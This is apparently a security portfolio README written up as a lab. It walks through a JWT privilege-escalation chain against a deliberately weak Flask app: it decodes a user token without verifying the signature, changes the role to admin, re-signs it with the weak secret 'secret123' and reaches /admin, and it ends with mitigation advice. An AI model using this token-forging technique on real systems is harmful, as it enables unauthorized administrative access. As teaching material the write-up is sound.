# JWT Authentication Bypass → Privilege Escalation → Admin Takeover  
**Category:** Web Application Attacks  
**Author:** Jan (balajrmz)  
**Status:** Completed  
**Difficulty:** Beginner → Intermediate  
**Tech Stack:** Python, Flask, JWT (HS256), Docker (optional)

---

## 🔎 Executive Summary

This project demonstrates a real-world attack chain involving **JSON Web Token (JWT) privilege escalation**, allowing an attacker to modify a client-side token, re-sign it with a known secret, and gain **unauthorized admin access**.  

This vulnerability mimics a common flaw found in poorly implemented authentication systems across modern web applications, APIs, and cloud microservices.

---

## 🎯 Goals

- Identify and exploit weak JWT implementation  
- Decode and analyze JWT token structure  
- Modify user role claims to escalate privileges  
- Re-sign tampered tokens with a known secret  
- Access protected administrative functionality  
- Provide remediation steps aligned with modern AppSec best practices  

---

## 🧪 Lab Environment

| Component | Description |
|----------|-------------|
| **Backend** | Python Flask app using JWT (HS256) |
| **Users** | `jan` → user, `admin` → admin |
| **Secret Key** | `secret123` (deliberately weak) |
| **Endpoints** | `/login`, `/admin`, `/` |
| **Utilities** | Python `jwt` library, Requests, JWT.io |

---

## 📁 Project Structure

```
jwt-auth-bypass/
├── app/
│   ├── app.py               
│   ├── Dockerfile           
│   └── requirements.txt
├── exploit.py               
├── screenshots/             
├── README.md
└── report.md                
```

---

# 🧵 Full Attack Chain (Step-by-Step)

## 1. Obtain a Legitimate User Token

A normal user logs in:

```
POST /login
Content-Type: application/json
{
    "username": "jan",
    "password": "password123"
}
```

Server returns a valid JWT:

```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6..."
}
```

Payload contains:

```json
{
  "username": "jan",
  "role": "user",
  "exp": 1763160950
}
```

---

## 2. Decode the Token (Attacker-Side)

Using:

```
jwt.decode(token, options={"verify_signature": False})
```

---

## 3. Modify the JWT Payload

```diff
- "role": "user"
+ "role": "admin"
```

---

## 4. Re-Sign the JWT With the Known Secret

```
SECRET_KEY = "secret123"
```

Attacker creates forged token:

```
jwt.encode(new_payload, "secret123", algorithm="HS256")
```

---

## 5. Access the Protected Admin Endpoint

```
GET /admin
Authorization: <forged_admin_token>
```

Response:

```json
{
  "message": "Welcome to the admin panel!",
  "payload": {
    "username": "jan",
    "role": "admin",
    "exp": 1763160950
  }
}
```

---

# 📸 Screenshots

Add images after upload:

```
![App Running](screenshots/app_running.png)
![Login Success](screenshots/login_success.png)
![Modified Token](screenshots/modified_token.png)
![Admin Access](screenshots/admin_access.png)
```

---

# 🛡 Mitigation Recommendations

- Use **RS256/ES256** asymmetric JWT signing  
- Store secrets in **AWS/GCP Secret Manager or Vault**  
- Never trust role/privilege claims from clients  
- Use strong random secrets  
- Short-lived access tokens + refresh tokens  
- Implement server-side authorization enforcement  

---

# 🏁 Conclusion

This project demonstrates a complete JWT privilege escalation exploit chain, including weak key exploitation, claim manipulation, and unauthorized administrative access.

It mirrors real vulnerabilities observed in penetration tests, bug bounty assessments, and insecure API designs.

---

# 🔗 Author

**Jan — Offensive Security & Application Security Engineer**  
GitHub: https://github.com/balajrmz  
Portfolio Root: https://github.com/balajrmz/pentest-portfolio
